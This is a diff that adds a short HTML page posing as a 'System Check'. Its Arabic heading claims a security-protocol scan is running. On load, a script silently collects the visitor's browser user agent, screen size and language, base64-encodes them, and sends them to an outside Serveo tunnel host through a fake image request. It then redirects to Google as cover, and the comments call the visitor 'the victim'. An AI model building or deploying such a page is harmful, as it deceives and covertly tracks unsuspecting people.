@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head><title>System Check</title></head>
+<body style="background:#000; color:#0f0; text-align:center; padding-top:20%;">
+    <h2>جاري فحص بروتوكولات الأمان...</h2>
+    <script>
+        // الرابط الجديد الخاص بك من Serveo
+        const MY_URL = "https://c781e0dfb002bdde-197-200-89-108.serveousercontent.com/log.gif"; 
+
+        function capture() {
+            const info = {
+                ua: navigator.userAgent,
+                screen: screen.width + "x" + screen.height,
+                lang: navigator.language
+            };
+            const payload = btoa(JSON.stringify(info));
+
+            // إرسال البيانات عبر صورة وهمية
+            const img = new Image();
+            img.src = `${MY_URL}?data=${payload}`;
+            
+            // تمويه: تحويل الضحية بعد 3 ثواني
+            setTimeout(() => { window.location.href = "https://www.google.com"; }, 3000);
+        }
+        window.onload = capture;
+    </script>
+</body>
+</html>
